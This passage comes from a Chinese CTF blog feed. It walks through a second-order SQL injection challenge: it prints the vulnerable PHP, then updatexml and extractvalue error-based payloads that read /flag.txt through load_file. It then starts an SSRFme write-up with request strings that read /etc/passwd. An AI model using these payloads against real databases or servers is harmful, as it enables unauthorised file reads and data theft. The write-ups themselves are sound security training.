class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123; </span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$fetch</span>) &amp;&amp; <span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;delete from `user` where `user_id`=&#x27;</span> . <span class="variable">$row</span>[<span class="string">&quot;user_id&quot;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;订单删除成功&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;未找到订单!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>     <span class="comment">//change.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$address</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]);</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$fetch</span>) &amp;&amp; <span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;update `user` set `address`=&#x27;&quot;</span>.<span class="variable">$address</span>.<span class="string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&#x27; where `user_id`=&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;订单修改成功&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;未找到订单!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="comment">//search.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123; </span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$fetch</span>) &amp;&amp; <span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$row</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;&lt;p&gt;姓名:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;user_name&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&lt;p&gt;, 电话:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;phone&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&lt;p&gt;, 地址:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;未找到订单!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  <span class="comment">//config.php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$DATABASE</span> = <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;host&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">    <span class="string">&quot;dbname&quot;</span> =&gt;<span class="string">&quot;ctfusers&quot;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$DATABASE</span>[<span class="string">&#x27;host&#x27;</span>],<span class="variable">$DATABASE</span>[<span class="string">&#x27;username&#x27;</span>],<span class="variable">$DATABASE</span>[<span class="string">&#x27;password&#x27;</span>],<span class="variable">$DATABASE</span>[<span class="string">&#x27;dbname&#x27;</span>]);</span><br></pre></td></tr></table></figure><h2 id="2-二次注入-amp-amp-updatexml报错注入"><a href="#2-二次注入-amp-amp-updatexml报错注入" class="headerlink" title="2.二次注入&amp;&amp;updatexml报错注入"></a>2.二次注入&amp;&amp;updatexml报错注入</h2><p>这里的<code>change.php</code>改订单的功能有二次注入的点，看代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>     <span class="comment">//change.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$address</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$fetch</span>) &amp;&amp; <span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;update `user` set `address`=&#x27;&quot;</span>.<span class="variable">$address</span>.<span class="string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&#x27; where `user_id`=&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;订单修改成功&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;未找到订单!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>他这个是先把<code>adress</code>字段从数据库读出来之后又拼接到了更新语句中了，老地址的问题，可用老地址进行updaatexml报错注入。</p><p><strong>插入语句</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;</span>;</span><br></pre></td></tr></table></figure><p>上面这里是<code>confirm.php</code>文件里面的插入数据库的语句。（PS：这里用了sql预处理语句，所以无法注入，应该是。）</p><p><strong>更新语句</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update `user` set `address`=&#x27;&quot;</span>.<span class="variable">$address</span>.<span class="string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&#x27; where `user_id`=&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br></pre></td></tr></table></figure><p><strong>注入</strong></p><blockquote><p>注意：updatexml报错注入最多一次只能查不到32个字符，算上前后两个<code>0x7e</code>就只剩下30个字符可以查询了。所以用下面的<code>substr()</code>函数分段注入。<br><code>payload为</code></p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#x27;</span><span class="operator">/</span>flag.txt<span class="string">&#x27;),1,30)),0x7e),1)#</span></span><br></pre></td></tr></table></figure><p><strong>注入原理</strong><br>这里的注入语句的构造原理主要就是，先插入的时候未对adress进行处理，但是后面更新订单的地方仍然没有进行处理，所以可能严格上来说不算是二次注入吧，但是这些词都是人造的，所以叫二次注入当然也没错。</p><p>如果我们一开始提交订单的时候提交的地址的值为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#x27;</span><span class="operator">/</span>flag.txt<span class="string">&#x27;),1,30)),0x7e),1)#</span></span><br></pre></td></tr></table></figure><p>那我们接下来更新订单时的语句就变成了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> `<span class="keyword">user</span>` <span class="keyword">set</span> `address`<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">where</span> user_id<span class="operator">=</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> substr(load_file(<span class="string">&#x27;/flag.txt&#x27;</span>),<span class="number">1</span>,<span class="number">30</span>)),<span class="number">0x7e</span>),<span class="number">1</span>)#<span class="string">&#x27;, `old_address`=&#x27;</span>.$<span class="type">row</span>[<span class="string">&#x27;address&#x27;</span>].<span class="string">&#x27; where `user_id`=.$row[&#x27;</span>user_id<span class="string">&#x27;];</span></span><br></pre></td></tr></table></figure><p>后面的大多数的内容都给注释掉了，只剩下了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> `<span class="keyword">user</span>` <span class="keyword">set</span> `address`<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">where</span> user_id<span class="operator">=</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> substr(load_file(<span class="string">&#x27;/flag.txt&#x27;</span>),<span class="number">1</span>,<span class="number">30</span>)),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>然后根据<code>updatexml报错注入</code>的原理，就是因为这里的<code>0x7e</code>的问题出现的报错注入。</p><p><strong>updatexml报错注入原理</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> substr(load_file(<span class="string">&#x27;/flag.txt&#x27;</span>),<span class="number">1</span>,<span class="number">30</span>)),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><blockquote><p>由于updatexml的第二个参数需要Xpath格式的字符串，以<code>~</code>开头的内容不是xml格式的语法，concat()函数为字符串连接函数显然不符合规则，但是会将括号内的执行结果以错误的形式报出，这样就可以实现报错注入了。</p></blockquote><h2 id="3-capture-the-flag"><a href="#3-capture-the-flag" class="headerlink" title="3.capture the flag"></a>3.capture the flag</h2><p>两次的<code>payload</code>分别为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#x27;</span><span class="operator">/</span>flag.txt<span class="string">&#x27;),1,30)),0x7e),1)#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">where</span> user_id<span class="operator">=</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> substr(load_file(<span class="string">&#x27;/flag.txt&#x27;</span>),<span class="number">30</span>,<span class="number">60</span>)),<span class="number">0x7e</span>),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure><p>当然也能用下面的<code>extractvalue报错注入</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; where user_id=extractvalue(1,concat(0x7e,(select substr(load_file(&#x27;</span><span class="operator">/</span>flag.txt<span class="string">&#x27;),1,20)),0x7e));#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">where</span> user_id<span class="operator">=</span>extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> substr(load_file(<span class="string">&#x27;/flag.txt&#x27;</span>),<span class="number">20</span>,<span class="number">50</span>)),<span class="number">0x7e</span>));#</span><br></pre></td></tr></table></figure><blockquote><p>attention:<code>extractvalue报错注入</code>、<code>updatexml报错注入</code>所依据的主要错误都是Xpath查询出现的格式错误。所以形式也都类似。</p></blockquote><p>这里的步骤可以是先提交有注入语句的address，后面用正常的地址改下订单就能报出错；<br>也可以是先提交正常的信息，然后改订单的时候先改地址为含有恶意代码的值，再改为正常值。<del>按说这里有addslashes函数，第二种应该不行的，但是确实也成功了。</del>都行，感觉第一种简单一些。<br>然后两次报错需提交的是两份订单，因为报错，所以如果只提交一份订单的话，第二次就根本修改不了地址，不行。</p><p><strong>flag</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;349dc15f-d73c-4e5e-91dd-1b01aa0ae474&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> updatexml报错注入 </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HITCON-2017-SSRFme</title>
      <link href="/2020/11/03/HITCON-2017-SSRFme/"/>
      <url>/2020/11/03/HITCON-2017-SSRFme/</url>
      
        <content type="html"><![CDATA[<blockquote><p>闲来静处，且将诗酒猖狂，唱一曲归来未晚，歌一调湖海茫茫       ——沈复《浮生六记》</p></blockquote><blockquote><p>今日网异云</p></blockquote><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=516997458&auto=1&height=66"></iframe><h2 id="1-源代码"><a href="#1-源代码" class="headerlink" title="1.源代码"></a>1.源代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123;</span><br><span class="line">        $http_x_headers = explode(&#x27;,&#x27;, $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]);</span><br><span class="line">        $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $http_x_headers[0];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    echo $_SERVER[&quot;REMOTE_ADDR&quot;];</span><br><span class="line"></span><br><span class="line">    $sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line"></span><br><span class="line">    $data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));</span><br><span class="line">    $info = pathinfo($_GET[&quot;filename&quot;]);</span><br><span class="line">    $dir  = str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));</span><br><span class="line">    @mkdir($dir);</span><br><span class="line">    @chdir($dir);</span><br><span class="line">    @file_put_contents(basename($info[&quot;basename&quot;]), $data);</span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure><blockquote><p>先创建一个目录<code>sandbox/md5(orange+你的ip)</code>，然后将传入的url使用<code>GET命令</code>去执行，再在解析<code>filename</code>参数，然后创建一个文件，并且将开始执行后的结果返回到这个文件。思路就是，先传访问一下?url&#x3D;目录&amp;filename&#x3D;随意，然后访问<code>/sandbox/你的md5结果</code>&#x2F;随意，看返回的结果。</p></blockquote><p>读取文件测试<br><img src="/2020/11/03/HITCON-2017-SSRFme//1.png"><br>这里是你的ip地址<br><img src="/2020/11/03/HITCON-2017-SSRFme//2.png"><br><code>orange223.90.160.65</code>md5加密之后为<code>77653c231bd9d86116927c3bac2da423</code></p><p>然后第一次的payload为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?url=/etc/passwd&amp;filename=1</span><br><span class="line">/sandbox/77653c231bd9d86116927c3bac2da423/1</span><br></pre></td></tr></table></figure><p><img src="/2020/11/03/HITCON-2017-SSRFme//3.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?url=/flag&amp;filename=1</span><br><span class="line">/sandbox/77653c231bd9d86116927c3bac2da423/1</span><br></pre></td></tr></table></figure><p>这个没回显，显然我们是不能靠这个读取到flag文件了。<br>然后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?url=/readflag&amp;filename=1</span><br><span 